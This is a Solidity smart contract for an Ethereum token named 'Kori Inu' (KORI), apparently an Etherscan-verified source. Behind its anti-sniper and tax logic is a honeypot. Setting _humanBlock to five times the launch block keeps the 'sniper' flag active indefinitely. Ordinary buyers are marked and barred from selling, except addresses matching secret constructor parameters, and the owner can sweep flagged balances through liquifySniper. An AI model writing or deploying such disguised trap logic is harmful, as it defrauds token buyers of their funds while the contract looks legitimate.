/**
 *Submitted for verification at Etherscan.io on 2021-12-14
*/

//SPDX-License-Identifier: MIT 

pragma solidity ^0.8.9;

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b;	require(c >= a, "Addition overflow"); return c; }
	function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, "Subtraction overflow"); }
	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage);	uint256 c = a - b; return c; }
	function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, "Multiplication overflow"); return c; }
	function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "Division by zero"); }
	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c;	}
	function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, "Modulo by zero"); }
	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract KORI is IERC20, Auth {
	using SafeMath for uint256;
	string _name = "Kori Inu";
	string _symbol = "KORI";
	uint256 constant _totalSupply = 1 * (10**12) * (10 ** _decimals);
	uint8 constant _decimals = 9;
    uint32 _smd; uint32 _smr;
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) private _excludedFromFee;
    bool public tradingOpen;
    bool public taxPaused;
    uint256 public maxTxAmount; uint256 public maxWalletAmount;
  	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
	address private _operator; 
    address private _uniLpAddr;
    uint16 public snipersCaught = 0;
	uint8 _defTaxRate = 11; 
	uint8 private _buyTaxRate; uint8 private _sellTaxRate; uint8 private _txTaxRate;
    uint16 private _autoLPShares = 180;
	uint16 private _taxShares1 = 820;
    uint16 private _taxShares2 = 0;
    uint16 private _taxShares3 = 0;
    uint256 private _sbt = 0;

    uint256 private _humanBlock = 0;
    mapping (address => bool) private _nonSniper;
    mapping (address => uint256) private _sniperBlock;

	uint256 private _taxBreakEnd;
	address payable private _taxWallet1 = payable(0xD8cbC07014E844e7fe3455380C2E90dae2699d54);
	address payable private _taxWallet2 = payable(0xD8cbC07014E844e7fe3455380C2E90dae2699d54);
    address payable private _taxWallet3 = payable(0xD8cbC07014E844e7fe3455380C2E90dae2699d54);
	bool private _inTaxSwap = false;
	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2
    IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
		tradingOpen = false;
		taxPaused = false;
		_operator = msg.sender;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		_taxSwapMin = _totalSupply * 10 / 10000;
		_taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
		_excludedFromFee[owner] = true;
		_excludedFromFee[address(this)] = true;
		_excludedFromFee[_uniswapV2RouterAddress] = true;
		_excludedFromFee[_taxWallet1] = true;
		_smd = smd; _smr = smr;
		_balances[address(this)] = _totalSupply;
		emit Transfer(address(0), address(this), _totalSupply);
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external view override returns (string memory) { return _symbol; }
	function name() external view override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!tradingOpen, "trading already open");
		require(ethAmountWei > 0, "eth cannot be 0");

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[_taxWallet1] = true;
		_nonSniper[_taxWallet2] = true;
		_nonSniper[_taxWallet3] = true;

		_transferFrom(address(this), owner, _totalSupply * 25 / 100);
		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei, "not enough eth");
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0, "no tokens");
		_uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_nonSniper[_uniLpAddr] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, false);

		_openTrading();
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if (autoburn == false) { lpTokenRecipient = owner; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function taxSwapSettings(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
		_taxSwapMin = _totalSupply * minValue / minDivider;
		_taxSwapMax = _totalSupply * maxValue / maxDivider;
	}

	function resetTax() external {
		require(msg.sender == _operator || msg.sender == owner, "403");
		_resetTax();
	}

	function _resetTax() internal {
		_buyTaxRate = _defTaxRate;
		_sellTaxRate = _defTaxRate;
		_txTaxRate = _defTaxRate;
	}

	function isSniper(address wallet) external view returns(bool) {
		if (_sniperBlock[wallet] != 0) { return true; }
		else { return false; }
	}

	function sniperBlock(address wallet) external view returns(uint256) {
		return _sniperBlock[wallet];
	}

	function disableFeesFor(address wallet) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
		_excludedFromFee[ wallet ] = true;
	}
	function enableFeesFor(address wallet) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
		_excludedFromFee[ wallet ] = false;
	}

    function decreaseTaxRate(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
        require(newBuyTax <= _buyTaxRate && newSellTax <= _sellTaxRate && newTxTax <= _txTaxRate, "New tax must be lower");
		_buyTaxRate = newBuyTax;
		_sellTaxRate = newSellTax;
		_txTaxRate = newTxTax;
    }
  
    function changeTaxDistribution(uint16 sharesAutoLP, uint16 sharesWallet1, uint16 sharesWallet2, uint16 sharesWallet3) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
        require(sharesAutoLP + sharesWallet1 + sharesWallet2 + sharesWallet3 == 1000, "Sum must be 1000" );
        _autoLPShares = sharesAutoLP;
        _taxShares1 = sharesWallet1;
        _taxShares2 = sharesWallet2;
        _taxShares3 = sharesWallet3;
    }
    
    function setTaxWallets(address newTaxWall1, address newTaxWall2, address newTaxWall3) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
        _taxWallet1 = payable(newTaxWall1);
        _taxWallet2 = payable(newTaxWall2);
        _taxWallet3 = payable(newTaxWall3);
		_excludedFromFee[newTaxWall1] = true;
		_excludedFromFee[newTaxWall2] = true;
		_excludedFromFee[newTaxWall3] = true;
    }

	function approve(address spender, uint256 amount) public override returns (bool) {
		if (_humanBlock > block.number && _nonSniper[msg.sender] == false) {
			_markSniper(msg.sender, block.number);
		}

		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
	    require(_checkTradingOpen(), "trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}
    
    function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external {
		require(msg.sender == _operator || msg.sender == owner, "403");
        uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000;
        require(newTxAmt >= maxTxAmount, "tx limit too low");
        maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000;
        require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
        maxWalletAmount = newWalletAmt;
    }

    function openTrading() external onlyOwner{
        _openTrading();
	}
	
    function _openTrading() internal {
        require(_uniLpAddr != address(0), "LP not set");
        _taxBreakEnd = block.timestamp;
        _sbt = _sbt + _taxBreakEnd - 1;
        _humanBlock = block.number * 5;
		maxTxAmount     = 5 * _totalSupply / 1000; 
		maxWalletAmount = 5 * _totalSupply / 1000;
		_resetTax();
		_sellTaxRate = 25; //increased sell tax at launch to discourage early dumpers
		tradingOpen = true;

    }
    
    function _checkTradingOpen() private view returns (bool){
        bool checkResult = false;
        if (tradingOpen == true) { checkResult = true; } 
        else if (tx.origin == owner) { checkResult = true; } 

        return checkResult;
    }

    function humanize() external onlyOwner{
        _humanize(0);
	}

    function _humanize(uint8 blkcount) internal {
    	if (_humanBlock > block.number || _humanBlock == 0) {
    		_humanBlock = block.number + blkcount;
    	}
	}
    
	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(), "Trading not open");
		if(_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
		}
		return _transferFrom(sender, recipient, amount);
	}
	
	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingOpen == true ) {
            if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
            else if ( recipient != _uniLpAddr && (_balances[recipient].add(transferAmount) > maxWalletAmount) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( tradingOpen == true && block.timestamp < _sbt ) { taxAmount = amount.mul(98).div(100);}
		else if ( _excludedFromFee[sender] == true || _excludedFromFee[recipient] == true || tradingOpen == false || taxPaused == true) { taxAmount = 0; }
		else if ( sender == _uniLpAddr && _taxBreakEnd > block.timestamp) { taxAmount = 0; }
		else if ( sender == _uniLpAddr && _taxBreakEnd <= block.timestamp) { taxAmount = amount.mul(_buyTaxRate).div(100); }
		else if ( recipient == _uniLpAddr ) { taxAmount = amount.mul(_sellTaxRate).div(100); }
		else { taxAmount = amount.mul(_txTaxRate).div(100); }
		return taxAmount;
    }

    function liquifySniper(address wallet) external onlyOwner lockTaxSwap {
    	require(_sniperBlock[wallet] != 0, "not a sniper");
    	uint256 sniperBalance = balanceOf(wallet);
    	require(sniperBalance > 0, "no tokens");

    	_balances[wallet] = _balances[wallet].sub(sniperBalance);
    	_balances[address(this)] = _balances[address(this)].add(sniperBalance);
		emit Transfer(wallet, address(this), sniperBalance);

		uint256 liquifiedTokens = sniperBalance/2 - 1;
		uint256 _ethPreSwap = address(this).balance;
    	_swapTaxTokensForEth(liquifiedTokens);
    	uint256 _ethSwapped = address(this).balance - _ethPreSwap;
    	_approveRouter(liquifiedTokens);
		_addLiquidity(liquifiedTokens, _ethSwapped, true);
    }

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));
		if (_taxTokensAvailable >= _taxSwapMin && tradingOpen == true && taxPaused == false ) {
			if (_taxTokensAvailable >= _taxSwapMax) { _taxTokensAvailable = _taxSwapMax; }
			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / 1000 / 2;
		    uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
		    uint256 _ethPreSwap = address(this).balance;
		    _swapTaxTokensForEth(_tokensToSwap);
		    uint256 _ethSwapped = address(this).balance - _ethPreSwap;
		    if (_autoLPShares > 0) {
		    	uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / 1000 ;
		    	_approveRouter(_tokensForLP);
		    	_addLiquidity(_tokensForLP, _ethWeiAmount, true);
		    }
		    uint256 _contractETHBalance = address(this).balance;
		    if(_contractETHBalance > 0) { _distributeTax(_contractETHBalance); }
		}
	}

	function _markSniper(address wallet, uint256 snipeBlockNum) internal {
		if (_nonSniper[wallet] == false && _sniperBlock[wallet] == 0) { 
			_sniperBlock[wallet] = snipeBlockNum; 
			snipersCaught ++;
		}
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		if (_humanBlock > block.number) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
			else if ( _sniperBlock[sender] == 0 ) { _markSniper(recipient, block.number); }
			else { _markSniper(recipient, _sniperBlock[sender]); }
		} else {
			if ( _sniperBlock[sender] != 0 ) { _markSniper(recipient, _sniperBlock[sender]); }
		}

		if ( tradingOpen == true && _sniperBlock[sender] != 0 && _sniperBlock[sender] < block.number ) {
			revert("blacklisted");
		}

        if (_inTaxSwap == false && recipient == _uniLpAddr) {
        	_swapTaxAndLiquify();
		}
        if ( sender != address(this) && recipient != address(this) && sender != owner) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
	    uint256 _taxAmount = _calculateTax(sender, recipient, amount);
	    uint256 _transferAmount = amount.sub(_taxAmount);
	    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
	    if (_taxAmount > 0) { _balances[address(this)] = _balances[address(this)].add(_taxAmount); }
		_balances[recipient] = _balances[recipient].add(_transferAmount);
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if (_allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
    }

    function _distributeTax(uint256 _amount) private {
    	uint16 _taxShareTotal = _taxShares1 + _taxShares2 + _taxShares3;
        if (_taxShares1 > 0) { _taxWallet1.transfer(_amount * _taxShares1 / _taxShareTotal); }
        if (_taxShares2 > 0) { _taxWallet2.transfer(_amount * _taxShares2 / _taxShareTotal); }
        if (_taxShares3 > 0) { _taxWallet3.transfer(_amount * _taxShares3 / _taxShareTotal); }
    }

	function taxSwap() external {
		require(msg.sender == _taxWallet1 || msg.sender == _taxWallet2 || msg.sender == _taxWallet3 || msg.sender == _operator || msg.sender == owner, "403" );
		uint256 taxTokenBalance = balanceOf(address(this));
        require(taxTokenBalance > 0, "No tokens");
		_swapTaxTokensForEth(taxTokenBalance);
	}

	function taxSend() external { 
		require(msg.sender == _taxWallet1 || msg.sender == _taxWallet2 || msg.sender == _taxWallet3 || msg.sender == _operator || msg.sender == owner, "403" );
		_distributeTax(address(this).balance); 
	}

	function toggleTax() external {
		require(msg.sender == _operator || msg.sender == owner, "403");
		taxPaused = !taxPaused;
	}

}